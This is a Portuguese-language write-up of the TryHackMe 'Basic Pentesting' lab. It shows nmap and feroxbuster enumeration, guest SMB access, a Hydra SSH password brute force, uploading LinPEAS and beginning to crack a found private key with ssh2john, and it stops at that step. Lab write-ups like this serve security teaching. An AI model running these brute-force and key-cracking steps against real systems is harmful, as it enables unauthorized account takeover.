---
title: 'TryHackMe: Basic Pentesting'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Nmap, Feroxbuster, Smbclient, Hydra, LinPEAS, SSH file transfer]
image:
  path: assets/images/tryhackme/basicpentesting/room.png
---

Olá, Bom dia a todos! Mais um desafio do site tryhackme fresquinho direto do forno para nós completarmos. 

O site está pedindo para nós: "Find the services exposed by the machine" [1], então vamos rodar o nosso famoso NMAP:

``` 
nmap -T4 -sC -sV -Pn -p- 10.10.137.173
```

O site também pergunta: "What is the name of the hidden directory on the web server(enter name without /)?" [2]

Para essa vamos rodar o feroxbuster na porta 80 (webserver), o bom é que o feroxbuster
faz uma busca com recursividade então ele encontra arquivos e diretórios com o comando padrão sem argumento
o problema é que ele faz muito mais requisições que o gobuster por exemplo, logo é mais ruidoso. (https://github.com/epi052/feroxbuster)

![alt text](assets/images/tryhackme/basicpentesting/image1.png)

```
feroxbuster -u http://10.10.137.173/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -r
```

Com feroxbuster conseguimos a resposta para [2] e descobrimos algumas rotas interessantes:

![alt text](assets/images/tryhackme/basicpentesting/image2.png)

![alt text](assets/images/tryhackme/basicpentesting/image3.png)

Ok, só de ler as mensagens já temos uma ideia de que temos que explorar /etc/shadow e provavelmente esses servidores SMB. Vou começar chamando scripts nmap para smb

![alt text](assets/images/tryhackme/basicpentesting/image4.png)

(meu alvo mudou para 10.10.86.35)

```
nmap -p 139,445 --script smb-enum-shares.nse 10.10.86.35
```

Com a saída do nmap podemos acessar usando o usuário guest

```
smbclient //10.10.86.35/Anonymous -U guest
```

Observando o arquivo staff.txt obtivemos dois nomes no arquivo staff.txt: 
```
cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

Ok agora teoricamente é uma boa tentar fazer um ataque de força bruta pois ja temos dois usuários: jan e kay. Vamos fazer no ssh da porta 22.

```
hydra -l jan -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 10.10.86.35 ssh -t 4
```

O código retorna a senha da jan.

Depois de logar com ssh da conta de jan, quero rodar um script de privilege scalation na máquina da vítima. Não adianta servir o script em um servidor http pois wget recebe permission denied. Para transferencia de arquivos usando SSH se usa scp Além disso, vamos colocar o arquivo dentro de dev/shm na vítima para evitar tomarmos permission denied, visto que essa pasta geralmente todos os usuarios tem permissão para escrita e leitura:

```
scp linpeas.sh jan@10.10.16.37:/dev/shm
```

Agora é só executar o script (conectar na máquina com ssh e executar sh linpeas.sh). Ok o comando me retornou uma chave privada dentro da pasta kay (que eu tinha achado antes mas quis seguir o passo a passo do site. Essa é uma chave privada que podemos copiar o conteúdo para nossa máquina e tentar conectar novamente com o login da kay)

```
(na minha máquina)
ssh -i kay_id_rsa kay@10.10.16.37
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'kay_id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "kay_id_rsa": bad permissions
kay@10.10.16.37's password: 
```

Ok o arquivo tem senha, vamos tentar crackeá-lo usando jhon the ripper. Depois de clonar o repositório no meu PC:

```
john/run/ssh2john.py kay_id_rsa > john.txt
```